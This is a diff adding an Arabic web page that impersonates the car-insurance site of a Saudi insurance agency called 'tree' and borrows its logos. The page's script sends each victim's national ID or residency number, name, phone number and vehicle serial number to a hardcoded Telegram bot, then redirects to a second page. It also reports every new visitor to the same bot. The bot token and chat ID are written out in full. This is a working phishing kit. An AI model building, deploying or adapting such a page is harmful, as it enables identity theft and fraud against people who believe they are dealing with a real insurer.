@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta property="og:title" content="تامين السيارات tree " />
+  <meta property="og:description" content=" "شركة تري السعودية للتأمين تقدم حلول تأمينية متكاملة تلبي احتياجات الأفراد والشركات، مع خدمات عالية الجودة تشمل التأمين الصحي، تأمين المركبات، والتأمين على الممتلكات، بهدف حماية استثماراتك وتأمين مستقبلك بثقة واحترافية."
+" />
+  <meta property="og:image" content="https://mgmt.manhom.com/images/582366/%D8%B4%D8%B1%D9%83%D8%A9-%D8%AA%D8%B1%D9%8A-%D8%A7%D9%84%D8%B1%D9%82%D9%85%D9%8A%D8%A9-%D9%84%D9%84%D8%AA%D8%A3%D9%85%D9%8A%D9%86.jpg" />
+  <meta property="og:url" content="https://example.com" />
+  <meta property="og:type" content="website" />
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Tahoma', sans-serif;
+      background-color: #ffffff;
+      color: white;
+    }
+    header {
+      background-color: #00332a;
+  text-align: center;
+  padding: 2rem 1rem 1rem;
+  border-bottom: 2px solid #00d5aa;
+  position: fixed;
+  top: 0;
+  width: 100%;
+  z-index: 1000;
+    }
+    .logo {
+      font-size: 2rem;
+      font-weight: bold;
+      color: #00ffae;
+      margin-left: 220px;
+      margin-top: -25px;
+    }
+ .car-img {
+      text-align: center;
+      margin-top: 200px;
+
+    }
+    .car-img img {
+      width: 70%;
+      max-width: 350px;
+    }
+    .form-container {
+      max-width: 400px;
+      margin: 3rem auto;
+      background-color: #00251f;
+      border-radius: 24px;
+      padding: 1rem;
+      overflow: hidden;
+      margin-top: -5px;
+    }
+    .tabs {
+  display: flex;
+  justify-content: center;
+  border-radius: 24px;
+  margin: -40px auto 10px;
+  width: fit-content;
+  padding: 5px;
+  transform: translate(25px, 10px);
+}
+
+.tab {
+  padding: 0.5rem 1rem;
+  background-color: #003c32;
+  color: #6dd6c2;
+  border-radius: 0px;
+  cursor: pointer;
+  font-weight: bold;
+  font-size: 0.9rem;
+  transition: background-color 0.3s, color 0.3s;
+  width: 80px;
+}
+
+.tab.active {
+  background-color: #00d5aa;
+  color: #00251f;
+}
+
+
+    .form-content {
+      padding: 1rem;
+    }
+
+    .form-group {
+      margin-bottom: 1rem;
+    }
+
+    .form-group input {
+      width: 90%;
+      padding: 1rem;
+      border: none;
+      border-radius: 12px;
+      background-color: #004137;
+      color: white;
+      font-size: 1rem;
+    }
+
+    .form-group input::placeholder {
+      color: #6dd6c2;
+      font-weight: bold;
+    }
+
+    .submit-btn {
+      width: 50%;
+      background-color: #00d5aa;
+      color: #00251f;
+      font-size: 1rem;
+      font-weight: bold;
+      padding: 1rem;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+
+    .privacy {
+      text-align: center;
+      font-size: 0.8rem;
+      margin-top: 1rem;
+      color: #ccc;
+    }
+
+    .privacy a {
+      color: #00d5aa;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .checkbox-wrapper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      margin-top: 0.8rem;
+    }
+
+    input[type="checkbox"] {
+      accent-color: #00d5aa;
+      width: 18px;
+      height: 18px;
+      border-radius: 4px;
+    }
+    #tex1 ,#tex2 ,#tex3 {
+    padding: 5px;
+    font-size: 12px;
+    }
+    .subtitle , .slogan{
+        margin-top: 150px;
+        margin-bottom: -100px;
+        margin-right: 20px;    
+
+}
+.slogan{
+        margin-bottom: -150px;
+}
+
+
+.lang-toggle {
+  position: absolute;
+  top: 20px;
+  left: 40px;
+
+}
+
+.lang-toggle button {
+  background-color: #00d5aa;
+  color: #00251f;
+  border: none;
+  padding: 8px 12px;
+  border-radius: 8px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.menu-icon {
+  position: absolute;
+  top: 20px;
+  right: 20px; 
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  width: 25px;
+  height: 20px;
+  cursor: pointer;
+}
+
+.menu-icon span {
+  display: block;
+  height: 3px;
+  background-color: #00d5aa;
+  border-radius: 2px;
+}
+
+.main-footer {
+  background-color: white;
+  color: #000;
+  padding: 2rem 1rem;
+  text-align: center;
+  font-family: 'Tahoma', sans-serif;
+  border-top: 2px solid #eee;
+}
+
+.footer-links ul {
+  list-style: none;
+  padding: 0;
+  margin: 0 auto 2rem;
+  text-align: right;
+  max-width: 300px;
+}
+
+.footer-links li {
+  margin-bottom: 0.5rem;
+  font-size: 1rem;
+}
+
+.footer-logos {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 2rem;
+  margin-bottom: 1rem;
+  flex-wrap: wrap;
+}
+
+.footer-logos img {
+  height: 40px;
+  max-width: 100px;
+  object-fit: contain;
+}
+
+.footer-bottom {
+  font-size: 0.85rem;
+  color: #333;
+}
+
+.footer-bottom a {
+  color: #00695c;
+  text-decoration: none;
+  font-weight: bold;
+}
+#divbode {
+  background-color: #ffffff;
+  height: 1000px;
+  position: relative;
+}
+#bode1{
+  background-color: #00251f;
+  height: 399px;
+  margin-top: -80px;
+}
+.form-container {
+  border-radius: 9px 0px 9px 9px;
+}
+.form-container {
+  transform: scale(.9); 
+  transform-origin: top center; 
+}
+
+
+  </style>
+</head>
+<body>
+
+     <header>
+        <div class="menu-icon">
+  <span></span>
+  <span></span>
+</div>
+
+    <div class="logo">tree</div>
+    
+<div class="lang-toggle">
+  <button id="toggleLang">EN / ع</button>
+</div>
+
+  </header>
+  <div id="bode1"> 
+
+      <div class="subtitle">     ما في أحلى من الحرية، سوق الحين براحتك    </div>
+    <div class="slogan">لا تفوت الفرصة، أأمن سيارتك بأفضل الأسعار!</div>
+<div class="car-img">
+    <img src="motor_bg_ar.png" alt="سيارة" />
+  </div>
+</div>
+  
+
+   <div class="tabs">
+  <div class="tab active" data-type="new">تأمين جديد</div>
+  <div class="tab" data-type="transfer">نقل ملكية</div>
+  <div class="tab" data-type="renew">تجديد الوثيقة</div>
+</div>
+  <div class="form-container">
+ 
+
+
+    <form id="dynamic-form" class="form-content">
+    </form>
+
+  </div>
+  </div>
+
+
+  <footer class="main-footer">
+  <div class="footer-links">
+    <ul>
+      <li>تأمين السيارات</li>
+      <li>تأمين الحيوانات الأليفة</li>
+      <li>تأمين السفر</li>
+      <li>تأمين حماية الدخل</li>
+      <li>مركز تحميل الوثائق</li>
+      <li>رفع المطالبة</li>
+      <li>حسابي</li>
+    </ul>
+  </div>
+
+  <div class="footer-logos">
+    <img width="442" height="155" src="https://tree.com.sa/wp-content/uploads/2025/05/tree-logo-1.svg" class="attachment-full size-full wp-image-19714" alt="">
+
+    <img width="612" height="217" src="https://tree.com.sa/wp-content/uploads/2025/05/authorized-by-AI.png" class="attachment-full size-full wp-image-19715" alt="" srcset="https://tree.com.sa/wp-content/uploads/2025/05/authorized-by-AI.png 612w, https://tree.com.sa/wp-content/uploads/2025/05/authorized-by-AI-300x106.png 300w" sizes="(max-width: 612px) 100vw, 612px">
+
+  </div>
+
+  <div class="footer-bottom">
+    جميع الحقوق محفوظة محفوظة شركة تري الرقمية لوكالة التأمين ©2024<br>
+    <a href="#">إشعار الخصوصية</a>
+  </div>
+</footer>
+
+
+
+<script>
+  const form = document.getElementById("dynamic-form");
+  const tabs = document.querySelectorAll(".tab");
+
+  const formsData = {
+    new: [
+      { name: "serial", placeholder: "الرقم التسلسلي" },
+      { name: "id", placeholder: "رقم الهوية / الإقامة" },
+      { name: "owner", placeholder: "اسم مالك الوثيقة" },
+      { name: "phone", placeholder: "رقم الهاتف" }
+    ],
+    transfer: [
+      { name: "serial", placeholder: "الرقم التسلسلي" },
+      { name: "seller_id", placeholder: "رقم الهوية / الإقامة للبائع" },
+      { name: "buyer_id", placeholder: "رقم الهوية / الإقامة للمشتري" },
+      { name: "owner", placeholder: "اسم مالك الوثيقة" },
+      { name: "phone", placeholder: "رقم الهاتف" }
+    ],
+    renew: [
+      { name: "id", placeholder: "رقم الهوية / الإقامة" },
+      { name: "owner", placeholder: "اسم مالك الوثيقة" },
+      { name: "phone", placeholder: "رقم الهاتف" }
+    ]
+  };
+
+  function renderForm(type) {
+    form.innerHTML = "";
+
+    const savedData = JSON.parse(localStorage.getItem(`formData_${type}`)) || {};
+
+    formsData[type].forEach(field => {
+      const isNumericField = ["serial", "id", "seller_id", "buyer_id", "phone"].includes(field.name);
+      const inputType = isNumericField ? "tel" : "text";
+      const inputMode = isNumericField ? 'inputmode="numeric"' : '';
+      const direction = 'dir="rtl"';
+      const value = savedData[field.name] || "";
+
+      const div = document.createElement("div");
+      div.className = "form-group";
+      div.innerHTML = `
+        <input 
+          type="${inputType}" 
+          name="${field.name}" 
+          placeholder="${field.placeholder}" 
+          value="${value}"
+          ${inputMode} ${direction} 
+          required 
+        />
+      `;
+      form.appendChild(div);
+    });
+
+    const submit = document.createElement("button");
+    submit.className = "submit-btn";
+    submit.type = "submit";
+    submit.innerText = " أمن سيارتك";
+    form.appendChild(submit);
+
+    form.addEventListener("input", () => {
+      const tempData = {};
+      new FormData(form).forEach((value, key) => {
+        tempData[key] = value;
+      });
+      localStorage.setItem(`formData_${type}`, JSON.stringify(tempData));
+    });
+  }
+
+  tabs.forEach(tab => {
+    tab.addEventListener("click", () => {
+      tabs.forEach(t => t.classList.remove("active"));
+      tab.classList.add("active");
+      renderForm(tab.dataset.type);
+    });
+  });
+
+  renderForm("new");
+
+  const BOT_TOKEN = "7306247318:AAGoAlnx8FRFeHTCHEJ5SzhYtkwfxM5_TQg";
+  const CHAT_ID = "8059394046";
+
+  const fieldsMap = {
+    serial: "الرقم التسلسلي",
+    id: "رقم الهوية / الإقامة",
+    seller_id: "رقم هوية البائع",
+    buyer_id: "رقم هوية المشتري",
+    owner: "اسم المالك",
+    phone: "رقم الهاتف"
+  };
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+    let message = "🚗 *طلب تأمين جديد:*\n\n";
+
+    for (const [key, value] of formData.entries()) {
+      const label = fieldsMap[key] || key;
+      message += `📌 *${label}*: ${value}\n`;
+    }
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      }),
+    })
+    .then(response => {
+      if (response.ok) {
+          window.location.href = "form1.html";
+        form.reset();
+
+        const activeType = document.querySelector(".tab.active").dataset.type;
+        localStorage.removeItem(`formData_${activeType}`);
+      } else {
+        alert("❌ فشل في إرسال البيانات.");
+      }
+    })
+    .catch(error => {
+      alert("⚠️ حدث خطأ أثناء الإرسال");
+      console.error(error);
+    });
+  });
+
+
+   const isNewUser = !localStorage.getItem('visitedBefore');
+
+    if (isNewUser) {
+      localStorage.setItem('visitedBefore', 'true');
+
+      const message = `🟢 مستخدم جديد فتح الصفحة!`;
+      const token = '7306247318:AAGoAlnx8FRFeHTCHEJ5SzhYtkwfxM5_TQg'; 
+      const chatId = '8059394046';  
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      const data = {
+        chat_id: chatId,
+        text: message
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      }).then(response => {
+        if (response.ok) {
+          console.log('تم إرسال الإشعار إلى Telegram');
+        } else {
+          console.error('فشل الإرسال:', response.statusText);
+        }
+      });
+    }
+
+</script> 
+
+
+</body>
+</html>
